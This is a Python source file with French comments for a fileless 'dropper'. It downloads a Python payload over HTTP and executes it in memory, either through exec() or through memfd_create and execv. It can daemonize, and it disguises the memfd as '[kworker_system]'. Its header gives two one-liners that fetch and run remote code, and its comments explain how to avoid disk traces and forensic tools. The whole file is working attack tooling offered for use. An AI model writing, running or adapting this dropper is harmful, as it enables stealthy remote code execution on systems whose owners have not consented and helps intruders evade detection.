#!/usr/bin/env python3
# one-liners :
#
# mode inline (le plus furtif — aucun fd, aucun execve) :
# python3 -c 'import urllib.request as r;exec(compile(r.urlopen("http://127.0.0.1/script.py").read(),"<m>","exec"))'
#
# mode memfd (même pattern que net_sh_dropper, daemonisable) :
# python3 -c 'import os,ctypes,urllib.request as r;L=ctypes.CDLL("libc.so.6");p=r.urlopen("http://127.0.0.1/script.py").read();f=L.memfd_create(b"k",0);os.write(f,p);[os._exit(0) for _ in range(2) if os.fork()>0];os.setsid();[os.dup2(os.open(os.devnull,2),i) for i in(0,1,2)];os.execv("/usr/bin/python3",["python3",f"/proc/self/fd/{f}"])'
#
# =============================================================================
# net_py_dropper.py — Exécution en mémoire de scripts Python reçus via le réseau
# Usage : python3 net_py_dropper.py
# =============================================================================
# Deux modes d'exécution (EXEC_MODE) :
#
# "inline" — avantage unique du dropper Python (impossible avec bash/binaire) :
#   Le payload est téléchargé dans un bytes buffer, compilé par compile() puis
#   exécuté via exec() dans le processus Python courant. Aucun fd anonyme, aucun
#   appel execve, aucune entrée dans /proc/self/fd/. L'outil d'analyse ne voit
#   qu'un processus python3 qui fait une requête HTTP puis s'exécute normalement.
#   Limitation : le payload partage l'espace de noms du dropper ; un sys.exit()
#   dans le payload termine aussi le dropper. Daemonisation via fork avant exec().
#
# "memfd" — même pattern que net_sh_dropper / net_bin_dropper :
#   memfd_create(2) sans MFD_CLOEXEC (le fd doit rester accessible après execv),
#   écriture du payload, puis os.execv("/usr/bin/python3", ["python3",
#   "/proc/self/fd/<n>"]). Python ouvre le fd comme un script ordinaire.
#   Visible dans /proc/<pid>/fd/ comme "/memfd:<name>", mais jamais sur disque.
#   Avantage : processus complètement séparé, pas de partage d'espace de noms.
#
# DAEMON_MODE :
#   True  — double-fork, setsid(), redirection stdin/stdout/stderr vers /dev/null.
#           Compatible avec les deux modes.
#   False — foreground, I/O hérités. Pour les scripts de recon dont on veut la sortie.
#
# Limitations :
#   mode inline  : /proc/<pid>/cmdline montre "python3 net_py_dropper.py" —
#                  aucune trace du payload, mais le dropper est visible.
#   mode memfd   : /proc/<pid>/fd/<n> révèle le memfd tant que le process tourne ;
#                  un eBPF catchant memfd_create + execve /proc/*/fd/* détecte le pattern.
#   Les deux modes : la requête HTTP reste visible en pcap/netflow.
# =============================================================================

import ctypes
import os
import sys
import urllib.request

URL_PAYLOAD = "http://127.0.0.1/script.py"
EXEC_MODE   = "inline"   # "inline" | "memfd"
DAEMON_MODE = True
SCRIPT_ARGS: list[str] = []


def _daemonize() -> None:
    pid = os.fork()
    if pid > 0:
        sys.exit(0)
    os.setsid()
    pid2 = os.fork()
    if pid2 > 0:
        os._exit(0)
    devnull = os.open(os.devnull, os.O_RDWR)
    for std_fd in (0, 1, 2):
        os.dup2(devnull, std_fd)


def run_inline(payload: bytes) -> None:
    if DAEMON_MODE:
        _daemonize()
    code = compile(payload, "<memfd>", "exec")
    exec(code, {"__name__": "__main__"})


def run_memfd(payload: bytes) -> None:
    libc = ctypes.CDLL("libc.so.6")
    memfd = libc.memfd_create(b"[kworker_system]", 0)
    if memfd == -1:
        sys.exit(1)
    os.write(memfd, payload)
    script_path = f"/proc/self/fd/{memfd}"
    if DAEMON_MODE:
        _daemonize()
    os.execv("/usr/bin/python3", ["python3", script_path] + SCRIPT_ARGS)


def run_fileless() -> None:
    with urllib.request.urlopen(URL_PAYLOAD) as resp:
        payload = resp.read()

    if EXEC_MODE == "inline":
        run_inline(payload)
    else:
        run_memfd(payload)


if __name__ == "__main__":
    run_fileless()
